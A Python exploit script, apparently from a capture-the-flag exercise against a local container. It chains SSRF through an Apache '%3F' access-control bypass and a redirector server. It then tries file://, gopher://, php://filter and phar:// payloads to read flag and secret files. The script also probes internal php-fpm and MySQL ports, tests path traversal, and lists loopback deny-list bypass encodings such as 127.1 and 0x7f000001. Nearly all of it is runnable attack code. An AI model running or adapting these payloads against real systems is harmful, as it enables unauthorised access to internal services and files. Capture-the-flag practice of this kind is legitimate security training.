#!/usr/bin/env python3
"""
Angle 3 local experiments against the handout container on 127.0.0.1:18080.
Can we read /flag.txt or /var/www/private/cap.mask without learning cap.mask,
so without stages C to F?

    1  fetch_source SSRF redirect to a non-http scheme (file://, gopher://, php://,
       data://, phar://). PHP's http wrapper re-enters itself on Location so this
       should fail, but it is one cheap test.
    2  redirect to http://127.0.0.1:9000, php-fpm FastCGI, and see what comes back
    3  redirect to http://127.0.0.1/flag.txt and relatives
    4  webhook_test POST SSRF, vk_host_is_internal only denies exact matches
"""
import http.server
import json
import socket
import sys
import threading
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18080"
GW = "172.17.0.1"


class Redir(http.server.BaseHTTPRequestHandler):
    """Answer every request with 418 + Location: <everything after /r/>."""

    protocol_version = "HTTP/1.1"

    def _go(self):
        target = urllib.parse.unquote(self.path[3:]) if self.path.startswith("/r/") else "/"
        self.send_response(418)
        self.send_header("Location", target)
        self.send_header("Content-Length", "0")
        self.end_headers()

    do_GET = do_POST = do_HEAD = _go

    def log_message(self, *a):
        pass


def start_redir():
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", 0), Redir)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, srv.server_address[1]


def get(url, timeout=12):
    try:
        r = urllib.request.urlopen(url, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return 0, f"ERR {e!r}"


def post_json(url, obj, timeout=12):
    data = json.dumps(obj).encode()
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return 0, f"ERR {e!r}"


def ssrf(redir_base, target):
    """fetch_source through the Apache ACL bypass, redirected at `target`."""
    u = (
        BASE
        + "/api/fetch_source.php%3Fa.php?url="
        + urllib.parse.quote(redir_base + "/r/" + urllib.parse.quote(target, safe=""), safe="")
    )
    return get(u)


def short(s, n=400):
    s = s.replace("\n", " ")
    return s[:n] + ("..." if len(s) > n else "")


def main():
    srv, port = start_redir()
    redir = f"http://{GW}:{port}"
    print(f"[*] redirector on {redir}")
    print(f"[*] base {BASE}")

    print("\n=== 0 sanity: SSRF to loopback keyring ===")
    print(short(ssrf(redir, "http://127.0.0.1/api/keyring.php")[1]))

    print("\n=== 1 non-http schemes on the redirect ===")
    for t in [
        "file:///flag.txt",
        "file:///var/www/private/cap.mask",
        "/flag.txt",  # relative-to-origin, sanity
        "gopher://127.0.0.1:9000/_test",
        "php://filter/convert.base64-encode/resource=/flag.txt",
        "data://text/plain,HELLO",
        "phar:///flag.txt",
        "compress.zlib://file:///flag.txt",
        "ftp://127.0.0.1/flag.txt",
        "HTTP://127.0.0.1/api/status.php",  # case, sanity
    ]:
        code, body = ssrf(redir, t)
        print(f"  {t:60s} -> {code} {short(body, 160)}")

    print("\n=== 2 php-fpm on 9000 ===")
    for t in ["http://127.0.0.1:9000/", "http://127.0.0.1:9000/flag.txt",
              "http://127.0.0.1:3306/"]:
        code, body = ssrf(redir, t)
        print(f"  {t:40s} -> {code} {short(body, 200)}")

    print("\n=== 3 docroot-relative flag ===")
    for t in ["http://127.0.0.1/flag.txt", "http://127.0.0.1/../flag.txt",
              "http://127.0.0.1/%2e%2e/flag.txt",
              "http://127.0.0.1/api/../../../flag.txt"]:
        code, body = ssrf(redir, t)
        print(f"  {t:45s} -> {code} {short(body, 160)}")

    print("\n=== 4 webhook_test POST SSRF, loopback deny-list bypass ===")
    for host in ["127.0.0.2", "127.1", "127.0.0.1.nip.io", "[::ffff:127.0.0.1]",
                 "2130706433", "0x7f000001", "127.0.0.1"]:
        code, body = post_json(
            BASE + "/api/webhook_test.php%3Fa.php",
            {"url": f"http://{host}/api/status.php", "event": "backup.failed"},
        )
        print(f"  {host:22s} -> {code} {short(body, 200)}")

    print("\n=== 4b webhook_test bytes oracle on loopback-only endpoints ===")
    for path in ["/api/keyring.php", "/api/keyring.php%3Fa.php",
                 "/api/render_template.php", "/api/vault_unseal.php%3Fa.php"]:
        code, body = post_json(
            BASE + "/api/webhook_test.php%3Fa.php",
            {"url": f"http://127.0.0.2{path}", "event": "maintenance.x"},
        )
        print(f"  {path:35s} -> {code} {short(body, 220)}")

    print("\n=== 5 Apache %3F confusion at a non-.php target ===")
    for p in [
        "/flag.txt%3Fa.php",
        "/api/%3Fa.php",
        "/api/x.php%3F/../../../../flag.txt",
        "/../flag.txt%3Fa.php",
        "/api/status.php%3F/flag.txt",
        "/assets/style.css%3Fa.php",
    ]:
        code, body = get(BASE + p)
        print(f"  {p:42s} -> {code} {short(body, 120)}")

    srv.shutdown()


if __name__ == "__main__":
    main()
